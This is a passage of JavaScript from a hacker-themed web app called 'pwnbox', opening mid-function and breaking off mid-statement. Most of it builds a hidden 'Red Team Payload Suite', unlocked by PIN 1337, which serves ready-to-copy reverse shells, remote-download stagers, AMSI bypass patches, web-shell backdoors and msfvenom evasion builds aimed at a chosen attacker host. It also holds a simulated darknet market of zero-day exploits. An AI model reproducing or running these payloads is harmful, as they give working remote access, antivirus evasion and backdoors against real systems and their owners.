                clearTimeout(konamiTimeout);
                konamiTimeout = setTimeout(() => {
                    konamiIndex = 0;
                    window.__pwnboxKonamiActive = false;
                }, 3000);
            } else {
                konamiIndex = 0;
                window.__pwnboxKonamiActive = false;
            }

            // 2. Secret Word Triggers ('hack', 'matrix', 'pranav')
            typedBuffer += key;
            if (typedBuffer.length > 20) typedBuffer = typedBuffer.slice(-20);

            // Check if current buffer matches any prefix of secret words
            const isMatchingPrefix = secretEasterWords.some(w => {
                for (let i = 1; i <= w.length; i++) {
                    if (typedBuffer.endsWith(w.slice(0, i))) return true;
                }
                return false;
            });

            if (isMatchingPrefix) {
                window.__pwnboxSecretTyping = true;
                clearTimeout(wordEasterEggTimeout);
                wordEasterEggTimeout = setTimeout(() => {
                    window.__pwnboxSecretTyping = false;
                }, 1200);

                // Consume single key if it could be part of an easter egg word on home page
                e.preventDefault();
                e.stopPropagation();
                if (e.stopImmediatePropagation) e.stopImmediatePropagation();
            } else {
                window.__pwnboxSecretTyping = false;
            }

            if (typedBuffer.endsWith('hack') || typedBuffer.endsWith('matrix') || typedBuffer.endsWith('pranav')) {
                const matched = typedBuffer.endsWith('hack') ? 'HACK' : (typedBuffer.endsWith('matrix') ? '1999 MATRIX' : 'PRANAV PUSHYA');
                typedBuffer = '';
                window.__pwnboxSecretTyping = false;
                e.preventDefault();
                e.stopPropagation();
                if (e.stopImmediatePropagation) e.stopImmediatePropagation();
                triggerSecretArchitectModal(`AUTHENTICATED BY ARCHITECT [${matched}]: ROOT ACCESS GRANTED`);
            }
        }, { capture: true });
    }

    function triggerSecretArchitectModal(message) {
        playVictorySfx();
        let modal = document.getElementById('secretArchitectModal');
        const isGodmode = message.includes('GODMODE');
        if (!modal) {
            modal = document.createElement('div');
            modal.id = 'secretArchitectModal';
            modal.className = 'secret-modal-backdrop';
            modal.innerHTML = `
                <div class="secret-modal-card">
                    <div class="secret-modal-header">
                        <span class="secret-tag">⚠️ CLASSIFIED ARCHITECT BYPASS</span>
                        <button class="secret-close-btn" onclick="document.getElementById('secretArchitectModal').style.display='none'">&times;</button>
                    </div>
                    <div class="secret-modal-body">
                        <h2 class="secret-title">PRANAV PUSHYA // SYSTEM CREATOR</h2>
                        <p class="secret-sub" id="secretModalMsg">${message}</p>
                        <div class="secret-code-block">
                            <code>[ROOT_CLEARANCE]: GRANTED<br>[CORE_SIGNATURE]: 0xPRANAV_2026<br>[STATUS]: ALL 7 KILL-CHAIN PROTOCOLS OVERRIDDEN</code>
                        </div>
                        <div class="secret-actions">
                            <button class="btn-secret-action" onclick="document.getElementById('secretArchitectModal').style.display='none'">RETURN TO OPERATIONAL DECK</button>
                            ${isGodmode ? `<button class="btn-secret-action" onclick="document.getElementById('secretArchitectModal').style.display='none'; if(typeof openGodModeModal === 'function') openGodModeModal();" style="background: #ffe600; color: #000; font-weight: 800;">OPEN ARCHITECT GODMODE ⚡</button>` : `<a href="dashboard.html" class="btn-secret-action red">PROCEED TO DASHBOARD &rarr;</a>`}
                        </div>
                    </div>
                </div>
            `;
            document.body.appendChild(modal);
        } else {
            const msgEl = document.getElementById('secretModalMsg');
            if (msgEl) msgEl.textContent = message;
            const actionsEl = modal.querySelector('.secret-actions');
            if (actionsEl) {
                actionsEl.innerHTML = `
                    <button class="btn-secret-action" onclick="document.getElementById('secretArchitectModal').style.display='none'">RETURN TO OPERATIONAL DECK</button>
                    ${isGodmode ? `<button class="btn-secret-action" onclick="document.getElementById('secretArchitectModal').style.display='none'; if(typeof openGodModeModal === 'function') openGodModeModal();" style="background: #ffe600; color: #000; font-weight: 800;">OPEN ARCHITECT GODMODE ⚡</button>` : `<a href="dashboard.html" class="btn-secret-action red">PROCEED TO DASHBOARD &rarr;</a>`}
                `;
            }
        }

        modal.style.display = 'flex';
    }

    // --- 5. INTERACTIVE AGENT DOSSIER / ID BADGE GENERATOR ---
    function initAgentCardGenerator() {
        const inputName = document.getElementById('genAgentAlias');
        const previewName = document.getElementById('previewAgentAlias');
        const previewAvatar = document.getElementById('previewAgentAvatar');
        const btnSave = document.getElementById('btnSaveAgentDossier');
        const avatarBtns = document.querySelectorAll('.gen-avatar-opt');

        if (!inputName || !previewName || !previewAvatar) return;

        const savedAlias = localStorage.getItem('agentAlias') || localStorage.getItem('pwnbox_agent_alias') || localStorage.getItem('pwnbox_user_name');
        if (savedAlias) {
            inputName.value = savedAlias;
            previewName.textContent = savedAlias.toUpperCase();
        }

        const savedAvatar = localStorage.getItem('pwnbox_agent_avatar');
        if (savedAvatar) {
            previewAvatar.textContent = savedAvatar;
        }

        inputName.addEventListener('input', (e) => {
            const val = e.target.value.trim();
            previewName.textContent = val ? val.toUpperCase() : 'UNKNOWN AGENT';
        });

        avatarBtns.forEach(btn => {
            btn.addEventListener('click', () => {
                avatarBtns.forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                const av = btn.getAttribute('data-avatar');
                previewAvatar.textContent = av;
                playTone(660, 'sine', 0.05);
            });
        });

        if (btnSave) {
            btnSave.addEventListener('click', () => {
                playStampSfx();
                const alias = inputName.value.trim() || 'Agent';
                const avatar = previewAvatar.textContent || '👾';

                localStorage.setItem('pwnbox_agent_alias', alias);
                localStorage.setItem('pwnbox_agent_avatar', avatar);
                localStorage.setItem('userAlias', alias);
                localStorage.setItem('agentAlias', alias);

                btnSave.textContent = '✓ DOSSIER SAVED!';
                btnSave.style.background = '#10b981';
                btnSave.style.color = '#ffffff';

                setTimeout(() => {
                    btnSave.textContent = '💾 SAVE TO DASHBOARD';
                    btnSave.style.background = '';
                    btnSave.style.color = '';
                }, 2000);
            });
        }
    }

    // ========================================================
    // --- SECRET GATEWAY 2: AIR-GAPPED CIPHER PINPAD & VAULT -
    // ========================================================
    let enteredPin = '';
    let versionClickCount = 0;
    let versionClickTimer = null;

    function initAirgapPinpad() {
        const verTrigger = document.getElementById('footerVersionTrigger');
        if (verTrigger) {
            verTrigger.addEventListener('click', () => {
                versionClickCount++;
                playKeyClick();
                clearTimeout(versionClickTimer);
                versionClickTimer = setTimeout(() => { versionClickCount = 0; }, 900);
                if (versionClickCount >= 3) {
                    clearTimeout(versionClickTimer);
                    versionClickCount = 0;
                    openAirgapModal();
                }
            });
        }
    }

    function openAirgapModal() {
        const modal = document.getElementById('airgapPinpadModal');
        if (!modal) return;
        modal.style.display = 'flex';
        clearPin();
        document.getElementById('pinpadView').style.display = 'flex';
        document.getElementById('pinpadVaultView').style.display = 'none';
        playTone(900, 'square', 0.1);
    }

    function closeAirgapModal() {
        const modal = document.getElementById('airgapPinpadModal');
        if (modal) modal.style.display = 'none';
        playClickSound();
    }

    function enterPinDigit(digit) {
        if (enteredPin.length < 4) {
            enteredPin += digit;
            playKeyClick();
            updatePinDisplay();
            if (enteredPin.length === 4) {
                setTimeout(submitPin, 200);
            }
        }
    }

    function clearPin() {
        enteredPin = '';
        updatePinDisplay();
        const fb = document.getElementById('pinFeedback');
        if (fb) fb.textContent = '';
        playTone(300, 'sine', 0.05);
    }

    function updatePinDisplay() {
        const disp = document.getElementById('pinDisplay');
        if (!disp) return;
        const masked = enteredPin.split('').map(() => '●').join(' ');
        const blanks = Array(4 - enteredPin.length).fill('_').join(' ');
        disp.textContent = `[ ${masked} ${blanks} ]`.trim();
    }

    function submitPin() {
        const fb = document.getElementById('pinFeedback');
        if (enteredPin === '1337') {
            playVictorySfx();
            if (fb) fb.innerHTML = '<span style="color: #10b981;">[✓] ACCESS GRANTED: RED TEAM PAYLOAD SUITE UNLOCKED</span>';
            setTimeout(() => {
                document.getElementById('pinpadView').style.display = 'none';
                document.getElementById('pinpadVaultView').style.display = 'flex';
                switchVaultTab('payloads');
            }, 600);
        } else if (enteredPin === '0000' || enteredPin === '6666' || enteredPin === '9999') {
            playVictorySfx();
            if (fb) fb.innerHTML = '<span style="color: #10b981;">[✓] ACCESS GRANTED: TOR ONION RELAY CONNECTED</span>';
            setTimeout(() => {
                document.getElementById('pinpadView').style.display = 'none';
                document.getElementById('pinpadVaultView').style.display = 'flex';
                switchVaultTab('darknet');
            }, 600);
        } else {
            playAlarmSfx();
            if (fb) fb.innerHTML = '<span style="color: var(--bauhaus-red);">[✕] INVALID PIN: TAMPER DETECTION TRIGGERED</span>';
            setTimeout(clearPin, 800);
        }
    }

    let activePayloadCat = 'all';

    function switchVaultTab(tab) {
        const btnPay = document.getElementById('tabBtnPayloads');
        const btnDark = document.getElementById('tabBtnDarknet');
        const tabPay = document.getElementById('vaultPayloadsTab');
        const tabDark = document.getElementById('vaultDarknetTab');

        if (tab === 'payloads') {
            if (btnPay) btnPay.classList.add('active');
            if (btnDark) btnDark.classList.remove('active');
            if (tabPay) tabPay.style.display = 'block';
            if (tabDark) tabDark.style.display = 'none';
            updateLivePayloads();
        } else {
            if (btnPay) btnPay.classList.remove('active');
            if (btnDark) btnDark.classList.add('active');
            if (tabPay) tabPay.style.display = 'none';
            if (tabDark) tabDark.style.display = 'block';
            initDarknetTerminal();
        }
        playClickSound();
    }

    function filterPayloadCategory(cat, btn) {
        activePayloadCat = cat;
        document.querySelectorAll('.payload-filter-btn').forEach(b => b.classList.remove('active'));
        if (btn) btn.classList.add('active');
        playKeyClick();
        updateLivePayloads();
    }

    function encodeString(raw, mode) {
        if (!raw) return '';
        if (mode === 'b64') {
            try { return btoa(raw); } catch(e) { return raw; }
        }
        if (mode === 'url') {
            return encodeURIComponent(raw);
        }
        if (mode === 'ps_b64') {
            try {
                const utf16Bytes = [];
                for (let i = 0; i < raw.length; i++) {
                    utf16Bytes.push(raw.charCodeAt(i) & 0xff);
                    utf16Bytes.push((raw.charCodeAt(i) >> 8) & 0xff);
                }
                const b64 = btoa(String.fromCharCode.apply(null, utf16Bytes));
                return `powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ${b64}`;
            } catch(e) {
                return btoa(raw);
            }
        }
        return raw;
    }

    function updateLivePayloads() {
        const lhost = (document.getElementById('payloadLhost') ? document.getElementById('payloadLhost').value.trim() : '') || '10.10.14.5';
        const lport = (document.getElementById('payloadLport') ? document.getElementById('payloadLport').value.trim() : '') || '4444';
        const encSelect = document.getElementById('payloadEncoding');
        const encMode = encSelect ? encSelect.value : 'raw';
        const searchInput = document.getElementById('payloadSearchInput');
        const searchTerm = (searchInput ? searchInput.value.toLowerCase().trim() : '');
        const container = document.getElementById('payloadsList');
        const counterPill = document.getElementById('payloadCounterPill');
        if (!container) return;

        // Base PowerShell TCP Raw
        const psTcpRaw = `$client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;

        const MASTER_PAYLOAD_CATALOG = [
            // --- LINUX / BASH ---
            {
                id: "lin_bash_tcp",
                title: "Bash Interactive TCP",
                cat: "linux",
                tagClass: "tag-linux",
                os: "Linux",
                desc: "Standard Bourne-again shell TCP descriptor redirection socket.",
                ext: "sh",
                code: `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`
            },
            {
                id: "lin_bash_udp",
                title: "Bash UDP Stealth Reverse Shell",
                cat: "linux",
                tagClass: "tag-linux",
                os: "Linux",
                desc: "Evasive UDP protocol egress socket to bypass strict TCP stateful inspection.",
                ext: "sh",
                code: `sh -i >& /dev/udp/${lhost}/${lport} 0>&1`
            },
            {
                id: "lin_py_pty",
                title: "Python 3 PTY Full Interactive TTY",
                cat: "linux",
                tagClass: "tag-linux",
                os: "Linux / macOS",
                desc: "Spawns a clean pseudo-terminal (PTY) with job control and signal handling.",
                ext: "py",
                code: `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`
            },
            {
                id: "lin_socat",
                title: "Socat Fully-Interactive PTY",
                cat: "linux",
                tagClass: "tag-linux",
                os: "Linux",
                desc: "Advanced TTY socket with full raw terminal ergonomics and window resizing.",
                ext: "sh",
                code: `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${lhost}:${lport}`
            },
            {
                id: "lin_nc_fifo",
                title: "Netcat Named Pipe (mkfifo)",
                cat: "linux",
                tagClass: "tag-linux",
                os: "Linux / BusyBox",
                desc: "Traditional FIFO pipe for embedded BusyBox, Alpine, and OpenWrt targets.",
                ext: "sh",
                code: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f`
            },
            {
                id: "lin_perl",
                title: "Perl One-Line Socket",
                cat: "linux",
                tagClass: "tag-linux",
                os: "Unix",
                desc: "Legacy Unix and Solaris compatible Perl TCP stream injection.",
                ext: "pl",
                code: `perl -e 'use Socket;$i="${lhost}";$p=${lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
            },
            {
                id: "lin_awk",
                title: "Awk Network Pipe Shell",
                cat: "linux",
                tagClass: "tag-linux",
                os: "Linux",
                desc: "Living-off-the-land pure Awk built-in /inet/tcp socket connection.",
                ext: "sh",
                code: `awk 'BEGIN {s = "/inet/tcp/0/${lhost}/${lport}"; while (42) { do{ printf "$ " |& s; s |& getline c; if (c) { while ((c |& getline) > 0) print $0 |& s; close(c); } } while (c != "exit") close(s); }}' /dev/null`
            },

            // --- WINDOWS / POWERSHELL ---
            {
                id: "win_ps_tcp",
                title: "PowerShell .NET TCP Client",
                cat: "windows",
                tagClass: "tag-windows",
                os: "Windows",
                desc: "Direct System.Net.Sockets stream invocation supporting full command stdout.",
                ext: "ps1",
                code: psTcpRaw
            },
            {
                id: "win_mshta",
                title: "MSHTA VBScript Stager",
                cat: "windows",
                tagClass: "tag-windows",
                os: "Windows",
                desc: "Executes remote payload via Microsoft HTML Application Host LOLBin.",
                ext: "bat",
                code: `mshta vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run ""powershell -nop -w hidden -c (New-Object Net.WebClient).DownloadString('http://${lhost}:8080/rev.ps1')"", 0, False))`
            },
            {
                id: "win_regsvr32",
                title: "Regsvr32 Squiblydoo SCT Dropper",
                cat: "windows",
                tagClass: "tag-windows",
                os: "Windows",
                desc: "Bypasses AppLocker by invoking remote COM Scriptlet (.sct) via scrobj.dll.",
                ext: "bat",
                code: `regsvr32 /u /n /s /i:http://${lhost}:8080/payload.sct scrobj.dll`
            },
            {
                id: "win_certutil",
                title: "Certutil In-Memory / Disk Stager",
                cat: "windows",
                tagClass: "tag-windows",
                os: "Windows",
                desc: "Abuses Windows Certificate Utility cache to fetch and stage binary implant.",
                ext: "bat",
                code: `certutil -urlcache -split -f http://${lhost}:8080/implant.exe %TEMP%\\implant.exe && %TEMP%\\implant.exe`
            },
            {
                id: "win_csharp_runner",
                title: "C# Inline Memory Exec Runner",
                cat: "windows",
                tagClass: "tag-windows",
                os: "Windows",
                desc: "Compiles memory payload on-the-fly using PowerShell Add-Type compiler.",
                ext: "ps1",
                code: `Add-Type -TypeDefinition @"\nusing System;using System.Net.Sockets;using System.IO;\npublic class WinRev { public static void Connect(){ var c=new TcpClient("${lhost}",${lport}); var s=c.GetStream(); var p=new System.Diagnostics.Process(); p.StartInfo.FileName="cmd.exe"; p.StartInfo.RedirectStandardInput=true; p.StartInfo.RedirectStandardOutput=true; p.StartInfo.UseShellExecute=false; p.Start(); var r=new StreamReader(s); var w=new StreamWriter(s); while(!p.HasExited){ w.Write(p.StandardOutput.ReadToEnd()); w.Flush(); p.StandardInput.WriteLine(r.ReadLine()); } } }\n"@; [WinRev]::Connect()`
            },

            // --- AMSI BYPASS & STAGERS ---
            {
                id: "stager_amsi_graeber",
                title: "Matt Graeber AMSI Memory Patch",
                cat: "stager",
                tagClass: "tag-stager",
                os: "Windows",
                desc: "Sets amsiInitFailed reflection flag to true, disabling AMSI for current runspace.",
                ext: "ps1",
                code: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`
            },
            {
                id: "stager_amsi_buffer",
                title: "AmsiScanBuffer 0x57 Memory Patch",
                cat: "stager",
                tagClass: "tag-stager",
                os: "Windows x64",
                desc: "Patches first byte of AmsiScanBuffer with RET instruction (0xC3) in memory.",
                ext: "ps1",
                code: `$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$b=$a.GetField('amsiContext','NonPublic,Static').GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32([IntPtr]($b+0x4),0x00000000)`
            },
            {
                id: "stager_web_cradle",
                title: "PowerShell Memory Web Cradle",
                cat: "stager",
                tagClass: "tag-stager",
                os: "Windows",
                desc: "Fileless memory stager fetching remote stage 2 payload without touching disk.",
                ext: "ps1",
                code: `powershell.exe -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://${lhost}:8080/stage2.ps1')"`
            },

            // --- WEB SHELLS ---
            {
                id: "web_php_mini",
                title: "PHP Stealth One-Liner Backdoor",
                cat: "web",
                tagClass: "tag-web",
                os: "Web / Cross-Platform",
                desc: "Minimal footprint stealth shell reading parameters via HTTP GET / POST.",
                ext: "php",
                code: `<?php if(isset($_REQUEST['cmd'])){ echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; } ?>`
            },
            {
                id: "web_php_eval",
                title: "PHP Base64 Dynamic Eval",
                cat: "web",
                tagClass: "tag-web",
                os: "Web",
                desc: "Obfuscated dynamic evaluator capable of loading complex C2 post-exploitation scripts.",
                ext: "php",
                code: `<?php @eval(base64_decode($_POST['z0'])); ?>`
            },
            {
                id: "web_jsp_exec",
                title: "JSP Java Runtime Command Runner",
                cat: "web",
                tagClass: "tag-web",
                os: "Tomcat / Java Web",
                desc: "Process runtime executor for Apache Tomcat, JBoss, and WebLogic containers.",
                ext: "jsp",
                code: `<%@ page import="java.io.*" %><% String cmd = request.getParameter("cmd"); if (cmd != null) { Process p = Runtime.getRuntime().exec(cmd); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %>`
            },
            {
                id: "web_aspx_cmd",
                title: "ASPX .NET Interactive Web Shell",
                cat: "web",
                tagClass: "tag-web",
                os: "IIS / ASP.NET",
                desc: "Native C# System.Diagnostics.Process invocation for Microsoft IIS servers.",
                ext: "aspx",
                code: `<%@ Page Language="C#" %><% Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["c"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().ToString()); %>`
            },

            // --- MSFVENOM BUILDER ---
            {
                id: "msf_win_x64",
                title: "MSFVenom Windows x64 Meterpreter EXE",
                cat: "msf",
                tagClass: "tag-windows",
                os: "Windows x64",
                desc: "Generates staged reverse TCP executable ready for delivery.",
                ext: "sh",
                code: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe -o payload_x64.exe`
            },
            {
                id: "msf_lin_elf",
                title: "MSFVenom Linux x64 Standalone ELF",
                cat: "msf",
                tagClass: "tag-linux",
                os: "Linux x64",
                desc: "Compiles staged ELF binary targeting modern 64-bit Linux distributions.",
                ext: "sh",
                code: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f elf -o implant.elf`
            },
            {
                id: "msf_encoded_shikata",
                title: "MSFVenom Shikata_ga_nai (5 Iterations)",
                cat: "msf",
                tagClass: "tag-stager",
                os: "Windows x86",
                desc: "Polymorphic XOR additive feedback encoder to evade legacy antivirus signatures.",
                ext: "sh",
                code: `msfvenom -p windows/shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -e x86/shikata_ga_nai -i 5 -f exe -o evasion.exe`
            },

            // --- CATCH LISTENERS ---
            {
                id: "list_nc_rlwrap",
                title: "Netcat Listener with rlwrap History",
                cat: "listener",
                tagClass: "tag-listener",
                os: "Attacker Host",
                desc: "Enables arrow keys history and tab navigation on incoming reverse shells.",
                ext: "sh",
                code: `rlwrap nc -lvnp ${lport}`
            },
            {
                id: "list_pwncat",
                title: "Pwncat-CS Automated Handler",
                cat: "listener",
                tagClass: "tag-listener",
                os: "Attacker Host",
                desc: "Modern post-exploitation framework with auto PTY spawn and persistence.",
                ext: "sh",
                code: `pwncat-cs -lp ${lport}`
            },
            {
                id: "list_msf_handler",
                title: "Metasploit Multi-Handler One-Liner",
                cat: "listener",
                tagClass: "tag-listener",
                os: "Attacker Host",
                desc: "Spawns silent msfconsole multi/handler ready to receive staging callbacks.",
                ext: "rc",
                code: `msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ${lhost}; set LPORT ${lport}; exploit"`
            },
            {
                id: "list_py_http",
                title: "Python3 Staging HTTP Server",
                cat: "listener",
                tagClass: "tag-listener",
                os: "Attacker Host",
                desc: "Hosts local directory payloads for certutil, wget, or curl web stagers.",
                ext: "sh",
                code: `python3 -m http.server 8080 --bind 0.0.0.0`
            }
        ];

        // Filter by category
        let filtered = MASTER_PAYLOAD_CATALOG.filter(item => {
            if (activePayloadCat !== 'all' && item.cat !== activePayloadCat) return false;
            if (searchTerm) {
                const combined = (item.title + ' ' + item.desc + ' ' + item.code).toLowerCase();
                if (!combined.includes(searchTerm)) return false;
            }
            return true;
        });

        if (counterPill) {
            counterPill.textContent = `Showing: ${filtered.length} of ${MASTER_PAYLOAD_CATALOG.length} Payloads`;
        }

        if (filtered.length === 0) {
            container.innerHTML = `<div style="text-align: center; color: #64748b; padding: 24px; font-family: 'Space Mono', monospace; font-size: 0.8rem;">[NO PAYLOADS MATCH SEARCH QUERY]</div>`;
            return;
        }

        container.innerHTML = filtered.map((item, idx) => {
            const finalCode = encodeString(item.code, encMode);
            return `
                <div class="payload-item-row">
                    <div class="payload-item-meta">
                        <div class="payload-title-badge">
                            <span>⚡ ${item.title}</span>
                            <span class="payload-os-tag ${item.tagClass}">${item.os}</span>
                        </div>
                        <div class="payload-actions-group">
                            <button class="btn-payload-tool" onclick="copySpecificPayload(this, 'payload_box_${idx}')">📋 COPY</button>
                            <button class="btn-payload-tool" onclick="downloadSpecificPayload('${item.title}', 'payload_box_${idx}', '${item.ext}')">💾 SAVE .${item.ext.toUpperCase()}</button>
                        </div>
                    </div>
                    <div style="font-size: 0.7rem; color: #94a3b8; font-family: 'Space Mono', monospace;">${item.desc}</div>
                    <div class="payload-code-container" id="payload_box_${idx}">${escapeHtml(finalCode)}</div>
                </div>
            `;
        }).join('');
    }

    function escapeHtml(text) {
        return text
            .replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;")
            .replace(/"/g, "&quot;")
            .replace(/'/g, "&#039;");
    }

    function copySpecificPayload(btn, boxId) {
        const box = document.getElementById(boxId);
        if (!box) return;
        const text = box.textContent;
        navigator.clipboard.writeText(text).then(() => {
            playKeyClick();
            const orig = btn.innerHTML;
            btn.innerHTML = '✓ COPIED!';
            btn.classList.add('copied');
            setTimeout(() => {
                btn.innerHTML = orig;
                btn.classList.remove('copied');
            }, 1600);
        });
    }

    function downloadSpecificPayload(title, boxId, ext) {
        const box = document.getElementById(boxId);
        if (!box) return;
        const text = box.textContent;
        const cleanName = title.toLowerCase().replace(/[^a-z0-9]/g, '_') + '.' + ext;
        const blob = new Blob([text], { type: 'text/plain;charset=utf-8' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = cleanName;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        playVictorySfx();
    }

    // Expose to window for inline onclick handlers
    window.switchVaultTab = switchVaultTab;
    window.filterPayloadCategory = filterPayloadCategory;
    window.updateLivePayloads = updateLivePayloads;
    window.copySpecificPayload = copySpecificPayload;
    window.downloadSpecificPayload = downloadSpecificPayload;

    // ========================================================
    // --- TOR DARKNET TERMINAL SIMULATOR ENGINE --------------
    // ========================================================
    let darknetBooted = false;
    let darknetIrcInterval = null;

    const DARKNET_MARKET_ITEMS = [
        { id: "0D-01", name: "Fortinet FortiOS Pre-Auth RCE", cve: "CVE-2024-21762", price: "2.4 XMR", seller: "shadow_broker", status: "VERIFIED" },
        { id: "0D-02", name: "Apple iOS 17.5.1 WebKit Sandbox Escape", cve: "0-DAY ZERO-CLICK", price: "18.5 XMR", seller: "hex_weaver", status: "AUCTION" },
        { id: "0D-03", name: "Siemens S7-1500 PLC Firmware Stuxnet-v2", cve: "SCADA-ZERO", price: "9.0 XMR", seller: "null_pointer", status: "RESERVED" },
        { id: "DB-04", name: "Fortune 500 Active Directory Kerberos Cache", cve: "14,800 HASHES", price: "0.8 XMR", seller: "g0d_speed", status: "VERIFIED" },
        { id: "RT-05", name: "Havoc C2 Ring0 Anti-EDR Kernel Driver", cve: "BYOVD WIN-11", price: "4.2 XMR", seller: "void_walker", status: "VERIFIED" }
    ];

    const DARKNET_IRC_MESSAGES = [
        { user: "shadow_broker", text: "New FortiOS corporate targets scanned on port 443. Shell drops incoming." },
        { user: "hex_weaver", text: "LockBit 4.0 encryptor sample uploaded to encrypted dump /tmp/lockbit.bin" },
        { user: "g0d_speed", text: "Anyone got valid NTLM hashes for domain controller DC01.CORP? Offering 0.5 XMR." },
        { user: "void_walker", text: "CrowdStrike kernel driver hook successfully patched using BYOVD vulnerable RTCore64.sys" }
    ];

    function initDarknetTerminal() {
        const out = document.getElementById('darknetOutput');
        if (!out || darknetBooted) return;
        darknetBooted = true;
        out.innerHTML = `
            <div style="color: #00ff66; font-family: 'Space Mono', monospace; line-height: 1.45;">
                <div>[SYSTEM] Initializing Tor circuit SOCKS5 handshake...</div>
                <div>[CIRCUIT] Guard Node: 185.220.101.5 (Frankfurt, DE) - <span style="color: #4ade80;">ESTABLISHED</span></div>
                <div>[CIRCUIT] Middle Node: 193.106.191.7 (Reykjavik, IS) - <span style="color: #4ade80;">ESTABLISHED</span></div>
                <div>[CIRCUIT] Exit Node: 91.240.118.2 (Amsterdam, NL) - <span style="color: #4ade80;">ESTABLISHED</span></div>
                <div>[SECURITY] ChaCha20-Poly1305 quantum stream encrypted. Memory RAM disk mounted.</div>
                <div style="color: #facc15; margin-top: 6px;">[AUTHENTICATED] Connected to Sovereign Hidden Service: pwnbox7x9k2v6m3q8h.onion:443</div>
                <div style="color: #94a3b8; font-size: 0.72rem; margin-top: 4px;">Type '<b>help</b>' or click the quick pills above to explore darknet modules.</div>
                <div style="border-bottom: 1px dashed rgba(0, 255, 102, 0.3); margin: 8px 0;"></div>
            </div>
        `;
    }

    function runDarknetShortcut(cmd) {
        const input = document.getElementById('darknetInput');
        if (input) input.value = cmd;
        executeDarknetCmd(cmd);
        if (input) input.value = '';
    }

    function handleDarknetKey(e) {
        if (e.key === 'Enter') {
            const input = document.getElementById('darknetInput');
            const cmd = input.value.trim();
            input.value = '';
            executeDarknetCmd(cmd);
        }
    }

    function executeDarknetCmd(cmdStr) {
        const out = document.getElementById('darknetOutput');
        if (!out) return;
        if (!cmdStr || !cmdStr.trim()) return;

        const cmd = cmdStr.toLowerCase().trim();
        const row = document.createElement('div');
        row.innerHTML = `<span style="color: #00ff66; font-weight: 800;">onion@pwnbox:~#</span> <span style="color: #ffffff;">${escapeHtml(cmdStr)}</span>`;
        out.appendChild(row);

        const resp = document.createElement('div');
        resp.style.margin = '6px 0 12px 0';
        playKeyClick();

        if (cmd === 'help') {
            resp.innerHTML = `
                <div style="color: #00ff66; font-weight: 800; margin-bottom: 4px;">UNDERGROUND ONION CLANDESTINE COMMANDS:</div>
                <div style="color: #cbd5e1; line-height: 1.5; font-size: 0.72rem;">
                    <div>• <b>market</b> / <b>shop</b> - Browse 0-Day Exploit Broker & Arms Market</div>
                    <div>• <b>market buy &lt;id&gt;</b> - Buy and decrypt zero-day weaponized POC</div>
                    <div>• <b>irc</b> / <b>chat</b> - Open encrypted live clandestine IRC chatroom</div>
                    <div>• <b>irc send &lt;msg&gt;</b> - Post an anonymous dispatch to darknet chat</div>
                    <div>• <b>crack &lt;md5_hash&gt;</b> - Interactive Rainbow Table Hash Cracker</div>
                    <div>• <b>leaks</b> - Intercepted corporate breach credential databases</div>
                    <div>• <b>neofetch</b> - Onion clandestine OS & architecture specs</div>
                    <div>• <b>circuits</b> - Inspect 3-hop Tor routing circuit telemetry</div>
                    <div>• <b>pgp</b> - View public cryptographic sovereign verification key</div>
                    <div>• <b>decrypt</b> - Decrypt classified master root credential flag</div>
                    <div>• <b>clear</b> - Wipe terminal screen buffer</div>
                </div>
            `;
        } else if (cmd === 'market' || cmd === 'shop') {
            let tableRows = DARKNET_MARKET_ITEMS.map(i => `
                <tr>
                    <td style="color: #facc15; font-weight: 800;">${i.id}</td>
                    <td><b>${i.name}</b><br/><span style="color: #94a3b8; font-size: 0.62rem;">${i.cve}</span></td>
                    <td class="darknet-price-xmr">${i.price}</td>
                    <td style="color: #38bdf8;">~${i.seller}</td>
                    <td class="darknet-status-verified">${i.status}</td>
                    <td><button onclick="runDarknetShortcut('market buy ${i.id}')" style="background: #00ff66; color: #000; border: none; font-size: 0.62rem; font-weight: 800; padding: 2px 6px; cursor: pointer;">ACQUIRE</button></td>
                </tr>
            `).join('');

            resp.innerHTML = `
